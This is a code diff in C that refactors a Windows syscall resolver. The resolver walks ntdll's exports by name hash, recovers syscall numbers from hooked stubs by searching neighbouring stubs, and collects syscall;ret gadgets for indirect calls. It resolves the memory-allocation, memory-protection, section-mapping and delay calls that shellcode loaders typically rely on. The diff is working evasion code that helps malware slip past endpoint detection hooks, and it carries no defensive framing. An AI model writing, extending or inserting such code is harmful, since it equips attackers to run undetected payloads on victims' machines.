@@ -112,47 +112,51 @@ PVOID GetRandomGadget(VOID) {
 }
 
 // -----------------------------------------------
-// Resolve a single NT syscall by hash
-// Extracts SSN + finds syscall;ret addr for indirect call
-// Uses neighbor stub fallback for hooked stubs
+// Given a syscall stub address, extract SSN and find
+// syscall;ret inside the stub. Uses neighbor fallback
+// for hooked stubs (first byte != 4C 8B D1).
 // -----------------------------------------------
-BOOL FetchNtSyscall(IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {
+static BOOL ResolveSyscallStub(IN PVOID pFuncAddr, IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {
 
-    if (!g_NtdllConfig.uModule)
-        return FALSE;
+    pNtSyscall->dwSyscallHash = dwSyscallHash;
 
-    if (dwSyscallHash == 0 || !pNtSyscall)
-        return FALSE;
+    // --- Extract SSN ---
+    BOOL bSsnFound = FALSE;
 
-    for (DWORD i = 0; i < g_NtdllConfig.dwNumberOfNames; i++) {
+    if (*((PBYTE)pFuncAddr + 0) == 0x4C &&
+        *((PBYTE)pFuncAddr + 1) == 0x8B &&
+        *((PBYTE)pFuncAddr + 2) == 0xD1 &&
+        *((PBYTE)pFuncAddr + 3) == 0xB8 &&
+        *((PBYTE)pFuncAddr + 6) == 0x00 &&
+        *((PBYTE)pFuncAddr + 7) == 0x00) {
 
-        PCHAR pcFuncName = (PCHAR)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfNames[i]);
-        PVOID pFuncAddr  = (PVOID)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfAddresses[g_NtdllConfig.pwArrayOfOrdinals[i]]);
-
-        if (HashStringJenkinsOneAtATime32BitA(pcFuncName) != dwSyscallHash)
-            continue;
-
-        pNtSyscall->dwSyscallHash = dwSyscallHash;
-
-        // --- Extract SSN ---
-        BOOL bSsnFound = FALSE;
-
-        if (*((PBYTE)pFuncAddr + 0) == 0x4C &&
-            *((PBYTE)pFuncAddr + 1) == 0x8B &&
-            *((PBYTE)pFuncAddr + 2) == 0xD1 &&
-            *((PBYTE)pFuncAddr + 3) == 0xB8 &&
-            *((PBYTE)pFuncAddr + 6) == 0x00 &&
-            *((PBYTE)pFuncAddr + 7) == 0x00) {
-
-            BYTE bHigh = *((PBYTE)pFuncAddr + 5);
-            BYTE bLow  = *((PBYTE)pFuncAddr + 4);
-            pNtSyscall->dwSSn = (bHigh << 8) | bLow;
-            bSsnFound = TRUE;
+        BYTE bHigh = *((PBYTE)pFuncAddr + 5);
+        BYTE bLow  = *((PBYTE)pFuncAddr + 4);
+        pNtSyscall->dwSSn = (bHigh << 8) | bLow;
+        bSsnFound = TRUE;
+    }
+    else {
+        // Search DOWN
+        for (WORD idx = 1; idx < 255; idx++) {
+            PBYTE pNeighbor = (PBYTE)pFuncAddr + (idx * 0x20);
+            if (*((PBYTE)pNeighbor + 0) == 0x4C &&
+                *((PBYTE)pNeighbor + 1) == 0x8B &&
+                *((PBYTE)pNeighbor + 2) == 0xD1 &&
+                *((PBYTE)pNeighbor + 3) == 0xB8 &&
+                *((PBYTE)pNeighbor + 6) == 0x00 &&
+                *((PBYTE)pNeighbor + 7) == 0x00) {
+                BYTE bH = *((PBYTE)pNeighbor + 5);
+                BYTE bL = *((PBYTE)pNeighbor + 4);
+                pNtSyscall->dwSSn = ((bH << 8) | bL) - idx;
+                bSsnFound = TRUE;
+                break;
+            }
         }
-        else {
-            // Search DOWN
+
+        // Search UP
+        if (!bSsnFound) {
             for (WORD idx = 1; idx < 255; idx++) {
-                PBYTE pNeighbor = (PBYTE)pFuncAddr + (idx * 0x20);
+                PBYTE pNeighbor = (PBYTE)pFuncAddr - (idx * 0x20);
                 if (*((PBYTE)pNeighbor + 0) == 0x4C &&
                     *((PBYTE)pNeighbor + 1) == 0x8B &&
                     *((PBYTE)pNeighbor + 2) == 0xD1 &&
@@ -161,53 +165,51 @@ BOOL FetchNtSyscall(IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {
                     *((PBYTE)pNeighbor + 7) == 0x00) {
                     BYTE bH = *((PBYTE)pNeighbor + 5);
                     BYTE bL = *((PBYTE)pNeighbor + 4);
-                    pNtSyscall->dwSSn = ((bH << 8) | bL) - idx;
+                    pNtSyscall->dwSSn = ((bH << 8) | bL) + idx;
                     bSsnFound = TRUE;
                     break;
                 }
             }
-
-            // Search UP
-            if (!bSsnFound) {
-                for (WORD idx = 1; idx < 255; idx++) {
-                    PBYTE pNeighbor = (PBYTE)pFuncAddr - (idx * 0x20);
-                    if (*((PBYTE)pNeighbor + 0) == 0x4C &&
-                        *((PBYTE)pNeighbor + 1) == 0x8B &&
-                        *((PBYTE)pNeighbor + 2) == 0xD1 &&
-                        *((PBYTE)pNeighbor + 3) == 0xB8 &&
-                        *((PBYTE)pNeighbor + 6) == 0x00 &&
-                        *((PBYTE)pNeighbor + 7) == 0x00) {
-                        BYTE bH = *((PBYTE)pNeighbor + 5);
-                        BYTE bL = *((PBYTE)pNeighbor + 4);
-                        pNtSyscall->dwSSn = ((bH << 8) | bL) + idx;
-                        bSsnFound = TRUE;
-                        break;
-                    }
-                }
-            }
         }
+    }
 
-        // Find any syscall;ret for this specific function (stored but may not be used)
-        for (DWORD j = 0; j < 0x100; j++) {
-            if (*((PBYTE)pFuncAddr + j + 0) == 0x0F &&
-                *((PBYTE)pFuncAddr + j + 1) == 0x05 &&
-                *((PBYTE)pFuncAddr + j + 2) == 0xC3) {
-                pNtSyscall->pSyscallAddress = (PVOID)((PBYTE)pFuncAddr + j);
-                break;
-            }
+    // Find any syscall;ret for this specific function (stored but may not be used)
+    for (DWORD j = 0; j < 0x100; j++) {
+        if (*((PBYTE)pFuncAddr + j + 0) == 0x0F &&
+            *((PBYTE)pFuncAddr + j + 1) == 0x05 &&
+            *((PBYTE)pFuncAddr + j + 2) == 0xC3) {
+            pNtSyscall->pSyscallAddress = (PVOID)((PBYTE)pFuncAddr + j);
+            break;
         }
+    }
 
-        if (bSsnFound && pNtSyscall->pSyscallAddress != NULL)
-            return TRUE;
+    return bSsnFound && pNtSyscall->pSyscallAddress != NULL;
+}
 
-        break;
+// -----------------------------------------------
+// Resolve a single NT syscall by hash
+// -----------------------------------------------
+BOOL FetchNtSyscall(IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {
+
+    if (!g_NtdllConfig.uModule || dwSyscallHash == 0 || !pNtSyscall)
+        return FALSE;
+
+    for (DWORD i = 0; i < g_NtdllConfig.dwNumberOfNames; i++) {
+        PCHAR pcFuncName = (PCHAR)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfNames[i]);
+        if (HashStringJenkinsOneAtATime32BitA(pcFuncName) != dwSyscallHash)
+            continue;
+
+        PVOID pFuncAddr = (PVOID)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfAddresses[g_NtdllConfig.pwArrayOfOrdinals[i]]);
+        return ResolveSyscallStub(pFuncAddr, dwSyscallHash, pNtSyscall);
     }
 
     return FALSE;
 }
 
 // -----------------------------------------------
-// Initialize all needed syscalls + gadget pool
+// Initialize all needed syscalls + gadget pool.
+// Single-pass over ntdll exports: hashes each name once
+// and matches against the target table (O(N) vs O(N*K)).
 // -----------------------------------------------
 BOOL InitializeNtSyscalls(OUT PNTAPI_FUNC pNtApis) {
 
@@ -218,20 +220,33 @@ BOOL InitializeNtSyscalls(OUT PNTAPI_FUNC pNtApis) {
     if (!CollectSyscallGadgets())
         return FALSE;
 
-    if (!FetchNtSyscall(NtAllocateVirtualMemory_JOAAT, &pNtApis->NtAllocateVirtualMemory))
-        return FALSE;
+    struct {
+        DWORD       dwHash;
+        PNT_SYSCALL pSyscall;
+    } targets[] = {
+        { NtAllocateVirtualMemory_JOAAT, &pNtApis->NtAllocateVirtualMemory },
+        { NtProtectVirtualMemory_JOAAT,  &pNtApis->NtProtectVirtualMemory  },
+        { NtDelayExecution_JOAAT,        &pNtApis->NtDelayExecution        },
+        { NtCreateSection_JOAAT,         &pNtApis->NtCreateSection         },
+        { NtMapViewOfSection_JOAAT,      &pNtApis->NtMapViewOfSection      },
+    };
+    const DWORD nTargets = (DWORD)(sizeof(targets) / sizeof(targets[0]));
+    DWORD nResolved = 0;
 
-    if (!FetchNtSyscall(NtProtectVirtualMemory_JOAAT, &pNtApis->NtProtectVirtualMemory))
-        return FALSE;
+    for (DWORD i = 0; i < g_NtdllConfig.dwNumberOfNames && nResolved < nTargets; i++) {
+        PCHAR pcFuncName = (PCHAR)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfNames[i]);
+        DWORD dwHash = HashStringJenkinsOneAtATime32BitA(pcFuncName);
 
-    if (!FetchNtSyscall(NtDelayExecution_JOAAT, &pNtApis->NtDelayExecution))
-        return FALSE;
+        for (DWORD t = 0; t < nTargets; t++) {
+            if (targets[t].dwHash != dwHash || targets[t].pSyscall->dwSyscallHash != 0)
+                continue;
 
-    if (!FetchNtSyscall(NtCreateSection_JOAAT, &pNtApis->NtCreateSection))
-        return FALSE;
+            PVOID pFuncAddr = (PVOID)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfAddresses[g_NtdllConfig.pwArrayOfOrdinals[i]]);
+            if (ResolveSyscallStub(pFuncAddr, targets[t].dwHash, targets[t].pSyscall))
+                nResolved++;
+            break;
+        }
+    }
 
-    if (!FetchNtSyscall(NtMapViewOfSection_JOAAT, &pNtApis->NtMapViewOfSection))
-        return FALSE;
-
-    return TRUE;
+    return nResolved == nTargets;
 }
